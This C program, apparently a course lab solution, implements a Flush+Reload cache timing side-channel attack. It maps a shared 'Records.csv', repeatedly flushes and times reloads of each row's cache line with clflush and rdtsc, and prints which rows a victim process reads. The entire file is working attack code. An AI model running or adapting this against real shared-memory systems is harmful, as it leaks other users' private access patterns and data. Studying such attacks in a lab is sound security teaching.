// Copyright [2019] <Yidong Fang>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <x86intrin.h>
#define HIT_THRESHOLD 30
#define TEST_TIME 15
#define CSV_ITEM_NUM 84

/* Lengths of each row in the CSV file. */
int csv_offsets[] = {
    126, 88, 98, 101, 89,  100, 93,  84, 98,  88,  110, 91, 101, 92,  91,
    90,  88, 98, 87,  94,  88,  96,  95, 97,  90,  92,  97, 88,  101, 96,
    90,  90, 89, 93,  92,  99,  95,  89, 82,  95,  95,  88, 96,  96,  95,
    102, 95, 99, 96,  95,  89,  103, 90, 97,  102, 88,  87, 89,  90,  90,
    97,  88, 86, 96,  92,  91,  105, 89, 95,  101, 97,  96, 100, 93,  91,
    88,  85, 90, 101, 107, 91,  90,  91, 111, 100};

// Return the size of a file
int64_t file_size(const char *filename) {
  struct stat s;
  if (stat(filename, &s) != 0) {
    printf("Error reading file stats !\n");
    return 1;
  }
  // printf("File size = %lu\n", s.st_size);
  return s.st_size;
}

/* Performs a dummy access
   to the address specified. */
void maccess(void *addr) {
  asm volatile("movq (%0), %%rax\n" : : "c"(addr) : "rax");
}

/* Flushes the cache block corresponding
   to the address from the entire cache
   hierarchy. */
void flush(void *addr) {
  asm volatile("clflush 0(%0)\n" : : "c"(addr) : "rax");
}

/* Reads the Time Stamp Counter. */
uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile("mfence");
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

/* combines rdtsc and maccess */
uint64_t measure_one_block_access_time(void *addr) {
  uint64_t cycles;

  asm volatile(
      "mov %1, %%r8\n\t"
      "lfence\n\t"
      "rdtsc\n\t"
      "mov %%eax, %%edi\n\t"
      "mov (%%r8), %%r8\n\t"
      "lfence\n\t"
      "rdtsc\n\t"
      "sub %%edi, %%eax\n\t"
      : "=a"(cycles) /*output*/
      : "r"(addr)
      : "r8", "edi");

  return cycles;
}

int main(int argc, char *argv[]) {
  int a[64] = {0};
  uint64_t hit_time, miss_time;

  if (argc != 2) {
    printf("Usage: attack hit_time,miss_time\n");
    return 1;
  }

  hit_time = atoi(strtok(argv[1], ","));
  miss_time = atoi(strtok(NULL, ","));
  if (hit_time < 0 || miss_time < 0) {
    printf("Error: Invalid hit/miss time\n");
    return 1;
  }

  char *filename = "Records.csv";
  int fd = open(filename, O_RDONLY);
  unsigned char *addr = (unsigned char *)mmap(0, file_size(filename), PROT_READ,
                                              MAP_SHARED, fd, 0);
  if (addr == (void *)-1 || addr == (void *)0) {
    printf("error: failed to mmap\n");
    return 1;
  }
  int scan_idx = 0, row_idx = 0;
  uint64_t time;
  unsigned char *offset_addrs[CSV_ITEM_NUM];
  uint64_t tmp_offset = 0;
  int hit_count[CSV_ITEM_NUM];
  int previous = -1;
  int hit_cycle_threshold = hit_time + (miss_time-hit_time)/3;
  int check_count = 0;
  for (int i = 0; i < CSV_ITEM_NUM; i++) {
    tmp_offset += csv_offsets[i];
    offset_addrs[i] = addr + tmp_offset;
    hit_count[i] = 0;
  }
  
  while (1) {
    scan_idx++;
    // random scan; This is to overcome prefetching.
    row_idx = (scan_idx * 10037 + 2333) % CSV_ITEM_NUM;
    // if negative
    if (row_idx < 0) {
      row_idx += CSV_ITEM_NUM;
    }
    //  Monitor the same cache set N times before monitoring the
    //   next set. (Clue: N~10 should work)
    for (size_t i = 0; i < TEST_TIME; i++) {
      flush(offset_addrs[row_idx]);
      // Use sched_yield() while waiting for victim to access.
      sched_yield();
      time = measure_one_block_access_time(offset_addrs[row_idx]);
      // Use hit_time and/or miss_time to detect hits and misses.
      if (time <= hit_cycle_threshold) {
        hit_count[row_idx] += 1;
      }
    }
    if (hit_count[row_idx] > HIT_THRESHOLD) {
      if (previous != row_idx) {
        printf("%d\n", row_idx + 1);
        // hit_count[row_idx] = 0;
	// clear count before this to make it more robust
	for(size_t i = 0; i <= row_idx; i++) {
	  hit_count[i] = 0;
	}
      }
    }
  }
  return 0;
}
